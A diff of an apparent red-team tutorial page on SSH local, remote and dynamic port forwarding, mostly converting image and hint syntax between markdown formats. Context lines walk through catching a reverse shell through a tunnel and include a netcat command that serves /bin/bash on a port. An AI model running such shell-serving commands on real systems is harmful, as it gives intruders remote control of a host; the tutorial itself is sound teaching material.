@@ -28,19 +28,19 @@ The above says: bind on a local port 9999 (on a host 10.0.0.5). Listen for any t
 
 We can see that the 127.0.0.1:9999 is now indeed listening:
 
-![](../../.gitbook/assets/ssh-local-bind.png)
+![[ssh-local-bind.png]]
 
 #### On machine 10.0.0.12
 
 Machine 10.0.0.12 is listening on port 4444 - it is ready to give a reverse shell to whoever joins:
 
-![](../../.gitbook/assets/ssh-local-port-1.png)
+![[ssh-local-port-1.png]]
 
 #### On machine 10.0.0.5
 
 Since the machine is listening on 127.0.0.1:9999, let's netcat it - this should give us a reverse shell from 10.0.0.12:4444:
 
-![](../../.gitbook/assets/ssh-local-port-2.png)
+![[ssh-local-port-2.png]]
 
 The above indeed shows that we got a reverse shell from 10.0.0.12 and the local tunnel worked.
 
@@ -66,7 +66,7 @@ Let's create a reverse shell listener bound to 127.0.0.1 (not reachable to hosts
 nc -lp 4444 -s 127.0.0.1 -e /bin/bash & ss -lt
 ```
 
-![](../../.gitbook/assets/ssh-remote-hidden.png)
+![[ssh-remote-hidden.png]]
 
 Now, let's open a tunnel to 10.0.0.5 and create remote port forwarding by exposing the port 4444 for the host 10.0.0.5:
 
@@ -80,11 +80,11 @@ The above says: bind a port 5555 on 10.0.0.5 and make sure that any traffic sent
 
 Indeed, we can see a port 5555 got opened up on 10.0.0.5 as part of the tunnel creation:
 
-![](../../.gitbook/assets/ssh-remote-exposed.png)
+![[ssh-remote-exposed.png]]
 
 Let's try sending some traffic to 127.0.0.1:5555 - this should give us a reverse shell from the 10.0.0.12:4444 - which it did:
 
-![](../../.gitbook/assets/ssh-remote-shell.png)
+![[ssh-remote-shell.png]]
 
 ## SSH: Dynamic Port Forwarding
 
@@ -98,7 +98,7 @@ The above essentially means: bind port 9090 on localhost and any traffic that ge
 
 For the demo, let's check what is our current IP before the dynamic port forwarding is set up:
 
-![](../../.gitbook/assets/ssh-dynamic-port-forwarding-myip1.png)
+![[ssh-dynamic-port-forwarding-myip1.png]]
 
 Creating an ssh tunnel to 159.65.200.10 and binding port 9090 on the local machine 10.0.0.5:
 
@@ -106,27 +106,26 @@ Creating an ssh tunnel to 159.65.200.10 and binding port 9090 on the local machi
 ssh -D9090 root@159.65.200.10
 ```
 
-![](../../.gitbook/assets/ssh-dynamic-port-forwarding-create-tunel.png)
+![[ssh-dynamic-port-forwarding-create-tunel.png]]
 
 Checking network connections on the localhost 10.0.0.5, we can see that the port 9090 is now listening:
 
-![](../../.gitbook/assets/ssh-dynamic-port-forwarding-port-listening.png)
+![[ssh-dynamic-port-forwarding-port-listening.png]]
 
 This means that if we send any traffic to 127.0.0.1:9090, that traffic will be sent to the hosts on the other end of the ssh tunnel - 159.65.200.10 and then the host 159.65.200.10 will make connections to other hosts on behalf of the host 10.0.0.5. It will return any data it receives back to the originating host 10.0.0.5.
 
 To test this, we can set our browser to use a socks5 proxy server 127.0.0.1:9090 like so:
 
-![](../../.gitbook/assets/ssh-dynamic-port-forwarding-configure-browser.png)
+![[ssh-dynamic-port-forwarding-configure-browser.png]]
 
 If we check what our IP is again, it is obvious that we are now indeed masquerading the internet as 159.65.200.10:
 
-![](../../.gitbook/assets/ssh-dynamic-port-forwarding-myip2.png)
+![[ssh-dynamic-port-forwarding-myip2.png]]
 
-{% hint style="info" %}
-Dynamic port forwarding plays along nicely with ProxyChains.
-{% endhint %}
+> [!INFO]
+> Dynamic port forwarding plays along nicely with ProxyChains.
 
 ## References
 
-{% embed url="https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html" %}
+[blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html](https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html)
 
